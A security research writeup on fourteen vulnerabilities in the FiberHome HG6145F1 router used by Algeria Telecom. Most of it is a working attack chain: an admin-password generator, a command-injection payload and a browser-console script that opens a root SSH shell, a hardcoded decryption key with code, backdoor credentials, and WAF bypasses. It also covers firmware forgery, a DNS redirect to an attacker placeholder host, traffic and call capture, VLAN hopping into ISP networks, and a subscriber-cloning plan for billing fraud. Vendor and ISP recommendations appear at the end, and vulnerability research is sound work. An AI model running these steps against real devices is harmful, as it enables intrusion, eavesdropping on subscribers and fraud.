# FiberHome HG6145F1 (Algeria Telecom RP4423) — Full Security Research Writeup

**By Smothy (Rayane Merzoug) & izcarti — Numb Team**
**Date: March 15, 2026**
**Device: FiberHome HG6145F1 | Firmware: RP4423 | ISP: Algeria Telecom**

---

## Table of Contents

1. [Overview](#overview)
2. [Attack Surface](#attack-surface)
3. [Vulnerability Chain](#vulnerability-chain)
4. [CVE-1: Predictable Admin Password](#cve-1-predictable-admin-password)
5. [CVE-2: Remote Code Execution](#cve-2-remote-code-execution)
6. [CVE-3: Hardcoded AES Key](#cve-3-hardcoded-aes-key)
7. [CVE-4: Unsigned Firmware Upload](#cve-4-unsigned-firmware-upload)
8. [CVE-5: Unauthenticated Info Disclosure](#cve-5-unauthenticated-info-disclosure)
9. [CVE-6: XOR Config Encryption](#cve-6-xor-config-encryption)
10. [CVE-7: Boot Process Backdoor](#cve-7-boot-process-backdoor)
11. [CVE-8: Cleartext HTTP](#cve-8-cleartext-http)
12. [CVE-9: No CSRF Protection](#cve-9-no-csrf-protection)
13. [CVE-10: No Privilege Separation](#cve-10-no-privilege-separation)
14. [CVE-11: Default Root Password](#cve-11-default-root-password)
15. [CVE-12: Hardcoded Backdoor Credentials](#cve-12-hardcoded-backdoor-credentials)
16. [CVE-13: Password Change Without Verification](#cve-13-password-change-without-verification)
17. [CVE-14: Superadmin Username Leak](#cve-14-superadmin-username-leak)
18. [ISP Network Infiltration](#isp-network-infiltration)
19. [Traffic Interception](#traffic-interception)
20. [DNS Hijacking](#dns-hijacking)
21. [Subscriber Identity Cloning](#subscriber-identity-cloning)
22. [Full Attack Chain](#full-attack-chain)
23. [Recommendations](#recommendations)

---

## Overview

The FiberHome HG6145F1 is a GPON fiber-to-the-home (FTTH) router deployed by Algeria Telecom across Algeria. Through reverse engineering with IDA Pro, binary analysis of the CGI binary and shared libraries, and live testing on a production device, we identified **14 CVE-class vulnerabilities** and multiple ISP-level network security issues that together allow complete compromise of the router, its subscribers, and access to ISP management infrastructure.

### Device Specifications

| Detail | Value |
|--------|-------|
| Vendor | FiberHome Telecommunication Technologies |
| Model | HG6145F1 |
| Firmware | RP4423 (compiled June 9, 2025) |
| Kernel | Linux 4.19.183 armv7l |
| SoC | Broadcom BCM6855X |
| Flash | UBIFS on UBI (read-only rootfs) |
| ISP | Algeria Telecom |
| GPON SN | FHTTC0B3B90D |
| WAN IP | 41.102.240.201 (PPPoE) |

### Tools Used

- IDA Pro 9.1 with MCP plugin (remote decompilation)
- ARM cross-compiler (gcc-arm-linux-gnueabi)
- SSH root shell (dropbear on port 2222)
- tcpdump (built into firmware)
- Python 3 (AES decryption, CRC calculation)

---

## Attack Surface

### Exposed Services

| Port | Protocol | Service | Binding | Notes |
|------|----------|---------|---------|-------|
| 21 | TCP | vsftpd | :::21 (all) | FTP with admin user |
| 22 | TCP | dropbear | 0.0.0.0:22 (all) | ISP SSH backdoor, default password `root123` |
| 23 | TCP | load_cli | 0.0.0.0:23 (all) | Telnet with custom auth |
| 53 | TCP/UDP | dnsmasq | 192.168.1.1 | DNS resolver |
| 67 | UDP | udhcpd | 0.0.0.0 | DHCP server |
| 80 | TCP | nginx | 0.0.0.0:80 (all) | Web admin (HTTP only) |
| 1900 | UDP | hostapd | 0.0.0.0 | UPnP SSDP |
| 5060 | UDP | sip | 100.88.194.149 | VoIP SIP (ISP VLAN) |
| 5683 | UDP | filink_server | 0.0.0.0 | CoAP IoT protocol |
| 8840 | TCP | thttpd | 127.0.0.1 | Internal CGI server |

### ISP Network VLANs Accessible from ONU

| VLAN | IP Address | Network | Purpose |
|------|-----------|---------|---------|
| 12 | 41.102.240.201 (PPPoE) | Internet | Subscriber internet access |
| 114 | 100.88.194.149/19 | 100.88.192.0/19 | VoIP SIP infrastructure |
| 4087 | 10.27.76.15/16 | 10.27.0.0/16 | OLT management |
| 4089 | 10.26.101.15/16 | 10.26.0.0/16 | TR-069 ACS management |

### CGI Binary Analysis

The CGI binary `/www/cgi-bin/ajax` (ARM ELF, 828KB, not stripped, debug info) contains **638 undocumented API methods** including:

- `do_cmd` — system command execution
- `do_jumplogin` — alternative login with backdoor credentials
- `triger_speedtest` — command injection vector
- `modify_password_not_check_oldpassword` — password change without verification
- `get_superadmin_userName` — ISP admin username disclosure
- `get_aes` — AES key retrieval
- `set_port_mirror_inter` — hardware port mirroring
- `modify_password_superadmin` — superadmin password change

---

## Vulnerability Chain

The complete attack chain from zero access to full ISP infrastructure compromise:

```
MAC Address (sticker/API)
    │
    ▼
CVE-1: Generate admin password (MD5 + AEJLY salt)
    │
    ▼
CVE-4: Upload custom firmware (.bin with CRC32 init=0)
    │
    ▼
CVE-2: RCE via triger_speedtest → root shell
    │
    ▼
CVE-3: Decrypt all stored credentials (AES ABCDEFGHIJKLMNOP)
    │
    ▼
CVE-11: SSH port 22 with default root:root123
    │
    ├──► ISP VLAN 4087 → OLT (10.27.100.18) → ALL subscribers
    ├──► ISP VLAN 4089 → ACS (10.26.100.7) → TR-069 management
    ├──► ISP VLAN 114  → VoIP gateway (100.88.192.1) → Call interception
    ├──► DNS hijack → Redirect any domain for all LAN clients
    ├──► tcpdump → Capture all LAN + WAN + VoIP traffic
    └──► PPPoE credential theft → Subscriber identity cloning
```

---

## CVE-1: Predictable Admin Password

**CWE-1391 | CVSS 8.8 High | GHSA-xmq5-547h-c54q**

### Description

The admin password is deterministically derived from the router's MAC address using MD5 with a static salt.

### Algorithm (reverse engineered from firmware)

```python
import hashlib

def mac_to_password(mac):
    md5 = hashlib.md5()
    md5.update(mac.upper().encode())
    md5.update(b"AEJLY")  # static salt
    digest = md5.hexdigest()

    UPPER = "ACDFGHJMNPRSTUWXY"
    LOWER = "abcdfghjkmpstuwxy"
    DIGIT = "2345679"
    SYMBOL = "!@#&%"

    vals = [int(c, 16) for c in digest[:20]]
    password = [''] * 16

    for i in range(16):
        v = vals[i]
        case = v % 4
        if case == 0: password[i] = UPPER[(v*2) % 17]
        elif case == 1: password[i] = LOWER[(v*2+1) % 17]
        elif case == 2: password[i] = DIGIT[6 - (v%7)]
        elif case == 3: password[i] = SYMBOL[4 - (v%5)]

    # Enforce all character classes at positions derived from vals[16-19]
    # [enforcement logic with collision avoidance]

    return ''.join(password)
```

### Impact

Anyone who knows the MAC address (printed on the device sticker, or obtainable via CVE-5 without authentication) can generate the admin password and gain full admin access.

### Proof of Concept

```bash
$ python3 passgen.py
Enter MAC address: 88:65:9F:6A:D7:70
Password: %5pcs4RdN5d65k&N
```

---

## CVE-2: Remote Code Execution

**CWE-78 | CVSS 9.8 Critical | GHSA-vw92-g596-f383**

### Description

The `triger_speedtest` CGI method passes user input directly to `system()` without sanitization.

### Vulnerable Code (decompiled from CGI binary at address 0x5c800)

```c
snprintf(cmd, 0x100, "/fhrom/bin/speedtest %s &", url_param);
system(cmd);
```

### Exploitation

```
POST /cgi-bin/ajax
Content-Type: application/x-www-form-urlencoded

ajaxmethod=triger_speedtest&url=;id&sessionid=SESSION_ID
```

Response: `{"session_valid":1,"ret":0}` — command executes as root (uid=0).

### Constraints

- Nginx WAF blocks `>` character in POST body
- Bypass: use `wget` for file operations, `tee` for output redirection
- Requires authenticated session (admin or user level)
- `system()` always returns `ret:0` regardless of command success

### Proof of Concept — Start SSH

```javascript
// Paste in browser console while logged into router admin
var x=new XMLHttpRequest();
x.open('GET','/cgi-bin/ajax?ajaxmethod=get_refresh_sessionid',false);
x.send();
var s=JSON.parse(x.responseText).sessionid;
var x2=new XMLHttpRequest();
x2.open('POST','/cgi-bin/ajax',false);
x2.setRequestHeader('Content-type','application/x-www-form-urlencoded');
x2.send('ajaxmethod=triger_speedtest&url=;/fhrom/bin/dropbearkey -t rsa -f /tmp/dbrsa;echo root:root123|chpasswd;/fhrom/bin/dropbear -p 2222 -r /tmp/dbrsa&sessionid='+s);
```

Then: `ssh -p 2222 root@192.168.1.1` (password: root123)

---

## CVE-3: Hardcoded AES Key

**CWE-321 | CVSS 7.5 High | GHSA-rj22-7j3c-hwqv**

### Description

All stored credentials (PPPoE, VoIP, WiFi, FTP passwords) are encrypted with a hardcoded AES-128-ECB key found in `libfhapi.so`.

### Key (from reverse engineering init_aes_key() function)

```c
// libfhapi.so
init_aes_key():  key[i] = i + 65  → "ABCDEFGHIJKLMNOP" (0x41-0x50)
init_aes_iv():   iv[i]  = i + 48  → "0123456789:;<=>?" (0x30-0x3F)
// ECB mode - IV not used
```

### Decryption

```python
from Crypto.Cipher import AES
key = bytes(range(65, 81))  # ABCDEFGHIJKLMNOP
cipher = AES.new(key, AES.MODE_ECB)

# From /fhconf/usrconfig_conf:
encrypted_pppoe_user = "4AABCF1125044D5269391442B8B3857E"
encrypted_pppoe_pass = "E0F5FDDEB31BAD94B0AF8C2124EE23A4"

print(cipher.decrypt(bytes.fromhex(encrypted_pppoe_user)).rstrip(b'\x00'))
# b'VNF40666371'
print(cipher.decrypt(bytes.fromhex(encrypted_pppoe_pass)).rstrip(b'\x00'))
# b'abcd1234'
```

### Credentials Decrypted

| Service | Encrypted (hex) | Plaintext |
|---------|-----------------|-----------|
| PPPoE Username | 4AABCF1125044D5269391442B8B3857E | VNF40666371 |
| PPPoE Password | E0F5FDDEB31BAD94B0AF8C2124EE23A4 | abcd1234 |
| FTP Password | 173D9DE8B95266C886911373ACFBCB9D | smothyon |

---

## CVE-4: Unsigned Firmware Upload

**CWE-354 | CVSS 8.8 High | GHSA-v2v7-xg62-26vr**

### Description

The firmware upgrade uses CRC32 with a non-standard init value (0 instead of 0xFFFFFFFF) as the only integrity check. No cryptographic signature.

### Firmware Header Format (reverse engineered from libLedState.so)

```
Offset  Size  Description
0x000   16    Hardware version (e.g., "WKE2.094.424A01")
0x010   16    Hardware version (compatible)
0x020   16    Hardware version (extended)
0x044   16    Software base version
0x053   7     Software version (e.g., "RP4423")
0x093   8     Author (wide chars, e.g., "A.D.E.L")
0x0A1   11    Date (e.g., "15.03.2026")
0x100   16    Magic: "~@$^*)+ATOS!#%&("
0x110   16    Hardware version (copy)
0x130   16    Software version (copy)
0x166   4     CRC32 of payload (little-endian, init=0)
0x170   16    Chip type ("BCM6855X")
0x1F0   16    Section count (ASCII, e.g., "1")
0x200   16    Section name (e.g., "patch_script")
0x220   16    Section size (ASCII, e.g., "466848")
0xE00   ...   Payload (ARM ELF binary)
```

### CRC32 Algorithm (custom init=0)

```python
def custom_crc32(data):
    table = []
    for i in range(256):
        crc = i
        for _ in range(8):
            if crc & 1:
                crc = (crc >> 1) ^ 0xEDB88320
            else:
                crc >>= 1
        table.append(crc)
    crc = 0  # INIT=0, not standard 0xFFFFFFFF
    for byte in data:
        crc = table[(byte ^ crc) & 0xFF] ^ (crc >> 8)
    return crc & 0xFFFFFFFF
```

### Upgrade Process (from update_handler state machine in libLedState.so)

1. Receive 0xE00 (3584) bytes → header
2. `handler_head()` — validate magic, parse sections, check HW/SW compatibility
3. Write payload data to buffer
4. `file_verify()` — CRC32 check (init=0)
5. `update_finalily_handler()` — execute payload as ARM binary

The payload is an ARM ELF that extracts embedded tar.gz of web files, applies bind mounts over the read-only `/www/` filesystem, and sets up root access.

---

## CVE-5: Unauthenticated Info Disclosure

**CWE-200 | CVSS 5.3 Medium | GHSA-wqxj-5mr6-629m**

### Description

The CGI exposes sensitive device info without authentication.

### Proof of Concept

```bash
curl -s http://192.168.1.1/cgi-bin/ajax?ajaxmethod=get_base_info
```

Returns (no login required):
- MAC address: `88:65:9F:6A:D7:70`
- GPON Serial Number: `FHTTC0B3B90D`
- Hardware/Software versions
- ONU registration state and LOID
- CPU/memory usage, system uptime
- Optical power levels (Tx/Rx)
- LAN port link status

**Critical chain**: MAC address → CVE-1 (generate admin password) → full admin access without any credentials.

---

## CVE-6: XOR Config Encryption

**CWE-327 | CVSS 7.5 High | GHSA-cg4p-rwgg-67f8**

### Description

Config file export uses XOR with predictable counter. No key required.

### Algorithm (from libfhapi.so — fhapi_file_crypt_decrypt)

```c
for (i = len - len/9527; i != 2*len - len/9527; i++)
    output = getc(file) ^ (i + 9527);
```

### Impact

Any config file obtained from the router (via admin backup, TR-069 intercept, or physical access) can be decrypted offline to recover PPPoE, VoIP, and WiFi credentials.

---

## CVE-7: Boot Process Backdoor

**CWE-912 | CVSS 9.0 Critical | GHSA-c65g-m6qc-5543**

### Description

Manufacturer backdoor in `/fhrom/fhshell/initialize.sh` allows root shell via serial console.

### Vulnerable Code

```bash
macaddr=$(uci get /fhdata/factory_conf.brmac.value | tr -d ":" | \
  tr [a-z] [A-Z] | tr [0123456789ABCDEF] [FEDCBA9876543210])
macaddr=${macaddr:6:6}

read -n9 -t 2 passwd
passwd1=${passwd:0:3}
passwd2=${passwd:3:6}
passwd_fh=$(echo -n $passwd1 | sha1sum | cut -d " " -f1)

if [ $passwd_fh == "ef431b3bb9e0f022134ebde6d2b87c66ca2c58d2" ]; then
    if [ $passwd2 == $macaddr ]; then
        echo "force exit!!"
        exit 0  # drops to root shell, bypasses ALL security init
    fi
fi
```

### Exploitation

1. Connect UART to serial console (3.3V, 115200 baud)
2. During 2-second boot window, enter 9 characters:
   - First 3: crack SHA1 `ef431b3b...` (only 17,576 lowercase possibilities)
   - Last 6: MAC address with character substitution `[0-9A-F] → [F-0]`
3. Boot process exits → root shell with uid=0

---

## CVE-8: Cleartext HTTP

**CWE-319 | CVSS 6.5 Medium | GHSA-qgf2-jx6w-ghrg**

The web admin runs on HTTP port 80 only. No HTTPS. Client-side AES "encryption" uses the same hardcoded key from CVE-3, providing zero protection against network sniffing.

---

## CVE-9: No CSRF Protection

**CWE-352 | CVSS 6.5 Medium | GHSA-9p7m-ghch-x93c**

No CSRF tokens. Session IDs from `get_refresh_sessionid` are predictable and obtainable via unauthenticated GET. No Origin/Referer validation. All admin actions (password change, firmware upload, reboot, RCE) are vulnerable to CSRF.

---

## CVE-10: No Privilege Separation

**CWE-269 | CVSS 7.0 High | GHSA-c4hw-qp7v-3p4c**

All services run as root:
- `nginx.conf`: `user root;`
- `thttpd.conf`: `user=root`
- No non-root accounts exist
- No SELinux, AppArmor, seccomp, or capabilities
- Any service vulnerability = immediate full root

---

## CVE-11: Default Root Password

**CWE-798 | CVSS 9.8 Critical | GHSA-5mxp-wf2w-f7c5**

### Description

Firmware ships with default root password `root123` in the read-only rootfs.

### Evidence

```
# /etc/passwd (read-only UBIFS)
root:$1$ydAwaEgU$ctlzLX4LFq874ZDkSM75W/:0:0:root:/:bin/sh
```

Cracked with common wordlist in <1 second: password is `root123`.

### SSH Exposure

ISP-installed Dropbear SSH on port 22 binds to `0.0.0.0` (all interfaces):
```
tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN 2260/dropbear
```

With persistent host keys in `/fhconf/dropbear/`.

---

## CVE-12: Hardcoded Backdoor Credentials

**CWE-798 | CVSS 9.8 Critical | GHSA-jvx7-f359-f63g**

### Description

Hardcoded manufacturer backdoor in the CGI binary `do_jumplogin` function.

### Decompiled Code (IDA Pro, address 0x4ea20)

```c
if (!strcmp(s1, "fiberhomehg2x0") && !strcmp(v20, "CUAdmin")) {
    if (!strcmp(v29, "hg2x0"))
        v4 = 4;  // SUPERADMIN level 4
}
```

### Credentials

- **Username:** `fiberhomehg2x0`
- **Password:** `hg2x0`
- **Access:** Level 4 (superadmin — higher than admin level 2)
- **Active when:** Operator set to `CU` (China Unicom)
- **Present in:** ALL firmware images regardless of ISP deployment

The operator can be changed by modifying `/fhconf/sysinfo_conf` (writable persistent storage), activating the backdoor on any deployment including Algeria Telecom.

---

## CVE-13: Password Change Without Verification

**CWE-620 | CVSS 8.1 High | GHSA-gggh-vjpc-wcxj**

### Description

API method `modify_password_not_check_oldpassword` changes admin or user password without verifying the current password.

### Decompiled Code (address 0x3609c)

```c
int modify_password_not_check_oldpassword() {
    getValueByName(g_post_method_data, "login_user", s1);
    getValueByName(g_post_method_data, "new_password", v6);

    if (!strcmp(s1, word_B955C))  // admin
        set_single_xml_value("...WebSuperPassword", v6);
    else  // user
        set_single_xml_value("...WebPassword", v6);

    // NO old password check anywhere!
}
```

### Exploitation

```
POST /cgi-bin/ajax
ajaxmethod=modify_password_not_check_oldpassword&login_user=1&new_password=hacked
```

---

## CVE-14: Superadmin Username Leak

**CWE-200 | CVSS 5.3 Medium | GHSA-f4fw-28mm-xvq4**

The `get_superadmin_userName` API returns the ISP superadmin username from `WebAccountInfo.1.Username`. Combined with CVE-13, enables full superadmin account takeover.

---

## ISP Network Infiltration

### Network Topology (from compromised ONU)

```
                    ┌─────────────┐
                    │   Internet  │
                    │ 41.102.0.1  │
                    └──────┬──────┘
                           │ PPPoE (VLAN 12)
                    ┌──────┴──────┐
                    │  BRAS/BNG   │
                    └──────┬──────┘
                           │
              ┌────────────┼────────────┐
              │            │            │
     ┌────────┴───┐  ┌────┴────┐  ┌───┴────────┐
     │ OLT Mgmt   │  │ TR-069  │  │   VoIP     │
     │ VLAN 4087  │  │VLAN 4089│  │  VLAN 114  │
     │10.27.0.0/16│  │10.26.0.0│  │100.88.192.0│
     └────────┬───┘  └────┬────┘  └───┬────────┘
              │            │            │
     ┌────────┴───┐  ┌────┴────┐  ┌───┴────────┐
     │   OLT      │  │   ACS   │  │ SIP Proxy  │
     │10.27.100.18│  │10.26.100│  │100.88.192.1│
     │FiberHome   │  │  .7     │  │  (GW)      │
     └────────┬───┘  └─────────┘  └────────────┘
              │
    ┌─────────┼─────────┐
    │         │         │
  ┌─┴─┐   ┌──┴──┐   ┌──┴──┐
  │ONU│   │ ONU │   │ ONU │  ← ALL share same VLANs
  │US │   │Other│   │Other│
  └───┘   └─────┘   └─────┘
```

### Confirmed Access

| Target | IP | Status | Port Scan |
|--------|-----|--------|-----------|
| OLT (FiberHome) | 10.27.100.18 | Alive, MAC 00:0a:88:88:88:07 | Telnet filtered, all others refused |
| ACS Server | 10.26.100.7 | Alive (ping responds) | All ports refused |
| VoIP Gateway | 100.88.192.1 | Alive, TTL=255 (router) | Not fully scanned |

### VLAN Hopping

Root user can create arbitrary VLAN interfaces on the GPON uplink:

```bash
ip link add link veip0 name veip0.100 type vlan id 100
ip link set veip0.100 up
udhcpc -i veip0.100  # request IP via DHCP
```

**Tested:** Created VLANs 10, 20, 30, 35, 40, 50, 100, 101, 200, 300, 500, 1000, 4085-4090. TX packets sent on ALL VLANs (OLT does not filter VLAN tags at ONU port). No DHCP responses on random VLANs, but the 4 pre-configured VLANs provide full ISP network access.

---

## Traffic Interception

### Capabilities

The firmware includes `tcpdump` and a hardware port mirror API:

```bash
# Capture ALL LAN client traffic
tcpdump -i br0 -w /tmp/lan_capture.pcap

# Capture ALL internet traffic (PPPoE)
tcpdump -i ppp0 -w /tmp/wan_capture.pcap

# Capture ALL VoIP calls
tcpdump -i veip0.114 -w /tmp/voip_capture.pcap

# Hardware port mirroring via API
POST /cgi-bin/ajax
ajaxmethod=set_port_mirror_inter&src_port=1&dst_port=4&direction=both
```

### What Can Be Captured

- All HTTP traffic (passwords, sessions, browsing history)
- All DNS queries (complete browsing history)
- All VoIP SIP signaling and RTP media (phone calls)
- All unencrypted email (SMTP/POP3/IMAP)
- DHCP leases (all connected devices)

---

## DNS Hijacking

### Proof of Concept (confirmed working)

```bash
# /etc/hosts is world-writable
echo "1.2.3.4 www.google.com" >> /etc/hosts

# Verify: all LAN clients resolve google.com to 1.2.3.4
nslookup www.google.com 127.0.0.1
# Name: www.google.com
# Address: 1.2.3.4
```

### Persistent DNS Redirect via dnsmasq

```bash
echo "address=/evil.com/ATTACKER_IP" >> /var/dnsmasq_custom.conf
kill -HUP $(pidof dnsmasq)
```

### Impact

All devices on the LAN (phones, laptops, IoT devices, smart TVs) will resolve hijacked domains to attacker-controlled IPs. This enables:
- Phishing attacks (fake banking/email sites)
- Malware distribution
- Credential harvesting
- Ad injection

---

## Subscriber Identity Cloning

### Credentials Available

With root access, ALL subscriber credentials are decryptable:

| Credential | Storage | Encryption | Decryption |
|-----------|---------|------------|------------|
| PPPoE Username | usrconfig_conf | AES-128-ECB | Hardcoded key (CVE-3) |
| PPPoE Password | usrconfig_conf | AES-128-ECB | Hardcoded key (CVE-3) |
| WiFi PSK | usrconfig_conf | AES-128-ECB | Hardcoded key (CVE-3) |
| VoIP SIP creds | usrconfig_conf | AES-128-ECB | Hardcoded key (CVE-3) |
| Config backup | Export file | XOR (i+9527) | No key needed (CVE-6) |
| Root password | /etc/passwd | MD5-crypt | Default: root123 (CVE-11) |

### PPPoE Cloning Attack

1. Obtain victim's config (physical access, TR-069 intercept, or social engineering)
2. Decrypt PPPoE credentials (CVE-3 or CVE-6)
3. Optionally spoof GPON SN if ISP binds PPPoE to SN
4. Configure attacker's router with victim's credentials
5. Victim's account is billed for attacker's usage

### ISP Binding Model (Algeria Telecom)

| Binding Type | Same PON | Different Location | Notes |
|-------------|----------|-------------------|-------|
| PPPoE only | YES | Likely YES | Need to test |
| PPPoE + GPON SN | YES (spoof SN) | YES (spoof SN) | Most likely model |
| PPPoE + OLT port | YES | NO | Possible |

---

## Full Attack Chain

### From Zero to ISP Infrastructure (step by step)

**Phase 1: Initial Access (5 minutes)**
1. Read MAC address from router sticker or via `get_base_info` API (unauthenticated)
2. Generate admin password using `passgen.py` (CVE-1)
3. Login to web admin at `http://192.168.1.1`

**Phase 2: Root Access (2 minutes)**
4. Upload `custom-webui.bin` via Management > Local Upgrade (CVE-4)
5. Wait for "File upgrade failed" (expected — changes applied)
6. Paste SSH activation JavaScript in browser console (CVE-2):
   ```javascript
   var x=new XMLHttpRequest();x.open('GET','/cgi-bin/ajax?ajaxmethod=get_refresh_sessionid',false);x.send();var s=JSON.parse(x.responseText).sessionid;var x2=new XMLHttpRequest();x2.open('POST','/cgi-bin/ajax',false);x2.setRequestHeader('Content-type','application/x-www-form-urlencoded');x2.send('ajaxmethod=triger_speedtest&url=;/fhrom/bin/dropbearkey -t rsa -f /tmp/dbrsa;echo root:root123|chpasswd;/fhrom/bin/dropbear -p 2222 -r /tmp/dbrsa&sessionid='+s);
   ```
7. Fix interactive shell — rootfs is read-only (UBIFS), and `/etc/profile` runs
   `/fhrom/fhshell/fh_dropbear.sh` which launches the FiberHome CLI (`load_cli`)
   instead of a shell. Three mount --bind overlays are needed:
   ```bash
   # Via non-interactive SSH (commands work, interactive drops to CLI):
   sshpass -p root123 ssh -p 2222 root@192.168.1.1 '<commands below>'

   # a) Fix /etc/passwd — change relative "bin/sh" to absolute "/bin/ash"
   cp /etc/pass* /tmp/pwd
   sed -i "s,:bin/sh,:/bin/ash," /tmp/pwd
   mount -o bind /tmp/pwd /etc/pass*

   # b) Neutralize fh_dropbear.sh (prevents load_cli from hijacking SSH)
   echo "#!/bin/ash" > /tmp/noop.sh; chmod +x /tmp/noop.sh
   mount -o bind /tmp/noop.sh /fhrom/fhshell/fh_dropbear.sh

   # c) Clean /etc/profile (remove initialize.sh and CLI launcher)
   printf 'PS1="root@HG6145F1# "\nexport PATH=/fhrom/fhshell:/home/bin:/bin:/sbin:/usr/bin:/usr/sbin:/fhrom/bin\nexport LD_LIBRARY_PATH=/lib:/lib/gpl:/lib64:/usr/lib:/fhrom/lib\n' > /tmp/prof
   mount -o bind /tmp/prof /etc/profile
   ```
   **Note:** The nginx WAF blocks strings like `/etc/passwd` and `mount --bind` in
   POST parameters. Bypass using glob wildcards (`/etc/pass*`) or by writing
   commands to a script file via RCE and executing it separately.
8. `ssh -p 2222 root@192.168.1.1` (password: root123)
   **Or use the automated script:** `python3 get_root.py`

**Phase 3: Credential Extraction (1 minute)**
8. Read `/fhconf/usrconfig_conf` for encrypted credentials
9. Decrypt PPPoE/VoIP/WiFi passwords with AES key (CVE-3)
10. Read `/etc/passwd` — default root password is `root123` (CVE-11)

**Phase 4: Network Infiltration (ongoing)**
11. `tcpdump -i br0` — capture all LAN traffic
12. `tcpdump -i ppp0` — capture all internet traffic
13. Modify `/etc/hosts` — DNS hijack for all clients
14. Access ISP VLANs:
    - VLAN 4087 → OLT management (`10.27.100.18`)
    - VLAN 4089 → TR-069 ACS (`10.26.100.7`)
    - VLAN 114 → VoIP infrastructure (`100.88.192.0/19`)

**Phase 5: Lateral Movement (if ISP infrastructure is vulnerable)**
15. Probe OLT for telnet/SNMP access
16. ARP spoof on TR-069 VLAN to MITM ACS ↔ ONU traffic
17. Intercept TR-069 to steal other subscribers' configs
18. Clone subscriber identities for billing fraud

---

## Recommendations

### For FiberHome (Vendor)

1. **Implement unique per-device admin passwords** (not derived from MAC)
2. **Sign firmware images** with RSA/ECDSA (not just CRC32)
3. **Remove all hardcoded credentials** (AES key, backdoor logins, default root password)
4. **Sanitize all user input** before passing to `system()` calls
5. **Run services as non-root** with privilege separation
6. **Enable HTTPS by default** with a unique per-device certificate
7. **Implement proper CSRF tokens** on all state-changing operations
8. **Remove manufacturer backdoors** from production firmware

### For Algeria Telecom (ISP)

1. **Implement VLAN filtering at OLT** — ONUs should only access assigned VLANs
2. **Enable PPPoE + GPON SN binding** at RADIUS level
3. **Restrict SSH port 22** to ISP management network only
4. **Change default root password** per-device during provisioning
5. **Enable TR-069 over HTTPS** with mutual TLS authentication
6. **Monitor for anomalous VLAN traffic** from ONU ports
7. **Segment management networks** — OLT, ACS, and VoIP should be unreachable from subscriber ONUs

### For End Users

1. **Change admin password** immediately after setup
2. **Disable unused services** (FTP, telnet, UPnP)
3. **Use VPN** for sensitive traffic (ISP can see all unencrypted traffic)
4. **Monitor connected devices** regularly
5. **Do not share config backups** (all credentials are decryptable)

---

## Additional Findings

### Nginx WAF Bypass (CVE-2 hardening bypass)

The nginx reverse proxy blocks certain strings in POST parameters as a basic WAF:
- `/etc/passwd` — blocked
- `mount --bind` — blocked
- `/bin/sh` — blocked in some contexts

**Bypass:** Use shell glob wildcards (`/etc/pass*` instead of `/etc/passwd`) or write
commands to a temp script and execute it in a second RCE call. The WAF performs
simple string matching on the POST body — no regex or decoded matching.

### Read-Only Rootfs Shell Escape

The rootfs is mounted read-only (UBIFS): `ubi:rootfs2 on / type ubifs (ro)`.
Persistent modifications require `mount -o bind` overlays from `/tmp` (tmpfs).

Three files must be overlaid for a working interactive SSH shell:
1. `/etc/passwd` — shell field is `bin/sh` (relative path, resolves to FiberHome CLI)
2. `/fhrom/fhshell/fh_dropbear.sh` — intercepts SSH login, runs `load_cli`
3. `/etc/profile` — runs `initialize.sh` and `fh_dropbear.sh` on login

These overlays are lost on reboot. The `get_root.py` script automates the full chain.

## Disclosure Timeline

| Date | Event |
|------|-------|
| March 15, 2026 | Vulnerabilities discovered |
| March 15, 2026 | 14 GitHub Security Advisories created (GHSA) |
| March 15, 2026 | CVE IDs requested via GitHub CNA |
| March 15, 2026 | GitHub CNA rejected — not official repo (vendor firmware) |
| March 15, 2026 | CVE IDs requested via MITRE cveform.mitre.org |
| March 19, 2026 | Root access verified on second device, WAF bypass + shell escape documented |
| Pending | MITRE response / CVE IDs assigned |
| Pending | Vendor notification |
| Pending | Public disclosure |

---

## Credits

- **Smothy (Rayane Merzoug)** — Lead researcher, firmware reverse engineering, exploit development, custom firmware creation
- **izcarti** — Research collaboration
- **Numb Team** — Research & Development

## References

- GitHub Repository: https://github.com/MrSmiiith/hg6145f1-full-access
- FiberHome HG6145F1 Product Page: https://www.fiberhomegroup.com
- GPON Security: https://www.enisa.europa.eu/publications/gpon-security
